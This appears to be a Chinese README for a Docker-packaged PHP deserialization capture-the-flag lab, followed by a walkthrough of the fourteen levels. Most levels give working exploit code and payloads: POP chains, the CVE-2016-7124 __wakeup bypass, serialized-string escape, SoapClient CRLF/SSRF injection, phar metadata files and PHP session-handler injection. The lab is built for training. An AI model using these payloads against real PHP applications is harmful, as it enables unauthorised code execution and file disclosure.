# About

该项目基于原项目：https://github.com/fine-1/php-SER-libs 制作，为其添加了容器环境/

关卡信息：

| 序号 | 可行性验证 | 关卡信息 | 镜像版本 | 备注 |
|:-----|:-----------|:---------|:---------|:-----|
| level1 | × | 类的实例化 | php:7.3-fpm-alpine | - |
| level2 | × | login | php:7.3-fpm-alpine | - |
| level3 | × | relogin | php:7.3-fpm-alpine | - |
| level4 | ✓ | create_fucntion与可变函数调用 | php:7.0-fpm-alpine | 5.6不支持可变函数，7.2已废除create_function |
| level5 | ✓ | 序列化格式过滤与CVE-2016-7124 | php:7.0.8-apache | CVE-2016-7124漏洞影响版本：PHP5 < 5.6.25，PHP7 < 7.0.10 |
| level6 | ✓ | 私有属性反序列化 | php:7.0.8-apache | escaped binary string(仅从php6开始支持) |
| level7 | ✓ | __call与属性的初始值 | php:7.0.8-apache | 同上 |
| level8 | × | 反序列化增逃逸 | php:7.0.8-apache | - |
| level9 | × | ezpop | php:7.0.8-apache | - |
| level10 | ✓ | just_one_soap | php:5.6-apache | 需要开启soap扩展(php5.6：extension=php_soap) |
| level11 | ✓ | a phar | php:7.3-fpm-alpine | php.ini中phar.readonly=Off（若有分号则去掉） |
| level12 | ✓ | a phar trick | php:7.3-fpm-alpine | 同上 |
| level13 | ✓ | 引用和session | php:7.0.8-apache | session.auto_start=0;<br/>session.serialize_handler = php;（level13均为默认设置） |
| level14 | × | session.upload_progress | php:7.0.8-apache |session.auto_start=0;<br/>session.serialize_handler = php_serialize;<br/>session.upload_progress.enabled = On;<br/>session.upload_progress.cleanup = Off;<br/>session.upload_progress.prefix = "upload_progress_";<br/>session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS";<br/>session.upload_progress.freq =  "1%";<br/>session.upload_progress.min_freq = "1";|

其他关卡未作可行性验证， 如有问题请提交issue。

验证环境配置如下：

```
OS: Debian GNU/Linux 12 (bookworm) x86_64 
Kernel: 6.1.0-26-amd64 
Shell: bash 5.2.15 
CPU: AMD Ryzen 7 7840HS w/ Radeon 780M Graphics (16) @ 3.800GHz 
```



# wp

**level1 类的实例化**

```php
<?php
class a{
    var $act;
    function action(){
        eval($this->act);
    }
}
$a=new a();
$a->act="show_source('flag.php');";
$a->action();
echo serialize($a);
?>
```



**level2 login**

```php
<?php
highlight_file(__FILE__);
class mylogin{
    var $user;
    var $pass;
    function __construct($user,$pass){
        $this->user=$user;
        $this->pass=$pass;
    }
    function login(){
        if ($this->user=="daydream" and $this->pass=="ok"){
            return 1;
        }
    }
}
$a=new mylogin('daydream','ok');
if($a->login())
{
    echo 'flag'."\n";
}
echo serialize($a);
?>
```



**level3 relogin**

```php
echo urlencode(serialize($a));
```

url编码后，抓包修改发送即可。以下截图为重放攻击。

![image-20220205105027434](./pic/image-20220205105027434.png)



**level4 create_fucntion与可变函数调用**

注意：两个类实例化调用属性的顺序。

```php
<?php
highlight_file(__FILE__);
class func
{
    public $key;
    public function __destruct()
    {
        unserialize($this->key)();
    }
}

class GetFlag
{
    public $code;
    public $action;
    public function get_flag(){
        $a=$this->action;
        $a('', $this->code);
    }
}
$a1=new func();
$b=new GetFlag();
$b->code='}include("flag.php");echo $flag;//';
$b->action="create_function";
$a1->key=serialize(array($b,"get_flag"));
echo serialize($a1);
?>
```

**level5 序列化格式过滤与CVE-2016-7124**

```php
<?php
class secret{
    var $file='index.php';

    public function __construct($file){
        $this->file=$file;
        echo $flag;
    }

    function __destruct(){
        include_once($this->file);
    }

    function __wakeup(){
        $this->file='index.php';
    }
}
$pa=new secret('flag.php');
echo serialize($pa),"\n";//O:6:"secret":1:{s:4:"file";s:8:"flag.php";}
$cmd=urlencode('O:+6:"secret":2:{s:4:"file";s:8:"flag.php";}');
echo $cmd;
?>
```

**level6 私有属性反序列化**

```php
<?php
class secret{
    private $comm;
    public function __construct($com){
        $this->comm = $com;
    }
    function __destruct(){
        echo eval($this->comm);
    }
}
$pa=new secret("system('type flag.php');");
echo serialize($pa),"\n";
//O:6:"secret":1:{s:12:" secret comm";s:24:"system('type flag.php');";}
//O:6:"secret":1:{S:12:"\00secret\00comm";s:24:"system('type flag.php');";}
?>
```

![image-20220208202613945](./pic/image-20220208202613945.png)

**level7 __call与属性的初始值**

```php
<?php
class you
{
    private $body;
    private $pro;
    function __construct(){
        $this->body=new my();
        $this->pro='yourname';
    }
    function __destruct()
    {
        $project=$this->pro;
        $this->body->$project();
    }
}

class my
{
    public $name='myname';

    function __call($func, $args)
    {
        if ($func == 'yourname' and $this->name == 'myname') {
            include('flag.php');
            echo $flag;
        }
    }
}
$p=new you();
echo serialize($p);
//大写S
//O:3:"you":2:{S:9:"\00you\00body";O:2:"my":1:{s:4:"name";s:6:"myname";}S:8:"\00you\00pro";s:8:"yourname";}
?>
```

**level8 反序列化增逃逸**

```php
<?php
highlight_file(__FILE__);
function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hack",$name);
    return $name;
}
class test{
    var $user;
    var $pass='daydream';
    function __construct($user){
        $this->user=$user;
    }
}
$a=new test('phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:8:"escaping";}');
//$a=new test('1');  O:4:"test":2:{s:4:"user";s:1:"1";s:4:"pass";s:8:"daydream";}
//逃逸内容：
//";s:4:"pass";s:8:"escaping";}
//计算需要链：
//phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:8:"escaping";}
$param=serialize($a);
echo $param,"\n";

$profile=unserialize(filter($param));
echo $profile->pass,"\n";
if ($profile->pass=='escaping'){
    echo 1;
}
?>
```

```
O:4:"test":2:{s:4:"user";s:116:"phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:8:"escaping";}";s:4:"pass";s:8:"daydream";}
```

![image-20220212192454775](./pic/image-20220212192454775.png)

**leve9 ezpop**

```php
<?php

class Modifier {
    private $var="flag.php";
    public function append($value)
    {
        include($value);
        echo $flag;
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __toString(){
        return $this->str->source;
    }
    public function __wakeup(){
        echo $this->source;
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

$a=new Modifier();
$b=new Show();
$c=new Test();

$b->source=$b;
$b->source->str=$c;
$c->p=$a;
echo "\n";
echo urlencode(serialize($b));
```

**level10 just_one_soap**

soap数据包测试方法：将loaction更改为监听ip和端口即可（注意：该包是index.php”发出“的）。

下图实例（公网ip测试）：![image-20220217103937584](./pic/image-20220217103937584.png)

```php
<?php
$post_data='pass=password';
$data_len=strlen($post_data);
$a = new SoapClient(null,array('location'=>'http://shiyan/SER/level10/flag.php','user_agent'=>'admin^^Content-Type: application/x-www-form-urlencoded^^Content-Length: '.$data_len.'^^^^'.$post_data,'uri'=>'bbba'));
$b = serialize($a);
$b = str_replace('^^',"\r\n",$b);
$b = str_replace('&','&',$b);
echo urlencode($b);
```

**level11 a phar**

```php
<?php
class TestObject {
}

@unlink("phar1.phar");
$phar = new Phar("phar1.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
$o = new TestObject();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test"); 
$phar->stopBuffering();
?>
```

![image-20220221092905715](./pic/image-20220221092905715.png)

**level12 a phar trick** 

![image-20220221100925190](./pic/image-20220221100925190.png)

**level13 引用和session** 

```php
<?php

class Flag{
    public $name;
    public $her;
    function __wakeup(){
        $this->name=$this->her=md5(rand(1, 10000));
        if ($this->name===$this->her){
            include('flag.php');
            echo $flag;
        }
    }
}
$b=new Flag();
$b->her=&$b->name;
echo serialize($b);

?>
```



`url/hint.php?a=|O:4:%22Flag%22:2:{s:4:%22name%22;N;s:3:%22her%22;R:2;}`

再访问index.php

**leve14 session.upload_progress**

特此注明：有关这道题其实还可以设置session.upload_cleanup = Off，然后考条件竞争，但是此方式与upload类相关漏洞过于相似，此项目就不设置其作为关卡了，感兴趣的朋友可以自行设置游玩。

exp

```php
<?php
class test{
    public $name;
    function __destruct(){
        if($this->name=='flag'){
            include('flag.php');
            echo $flag;
        }
        else{
            phpinfo();
        }
    }
}
$a=new test();
$a->name='flag';
echo serialize($a);
```

`|O:4:\"test\":1:{s:4:\"name\";s:4:\"flag\";}`

test.html

<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<form id="upload-form" action="http://************/level14/index.php" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="test"/>
        上传文件…
        <input name="file1" type="file" />
        <input type="submit" value="上传"/>
    </form>


通过test.html“上传”任意文件，然后抓包，利用payload改包，最后发包，OK

![image-20220311065409439](./pic/image-20220311065409439.png)







